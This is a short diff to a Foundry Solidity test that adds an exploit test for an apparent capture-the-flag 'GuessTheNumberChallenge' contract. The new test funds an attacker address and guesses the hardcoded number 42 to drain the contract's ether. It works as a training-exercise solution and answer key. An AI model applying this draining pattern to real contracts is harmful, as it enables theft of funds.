@@ -11,5 +11,13 @@ contract GuessNumTest is Test {
 
     function setUp() public {
         guessNum = new GuessTheNumberChallenge();
+        deal(h3x0r, 1 ether);
+        deal(address(guessNum), 2 ether);
+    }
+
+    function testGuessNumExploit() public {
+        vm.startPrank(h3x0r);
+        guessNum.guess{value: 1 ether}(uint8(42));
+        assertEq(h3x0r.balance, 2 ether);
     }
 }
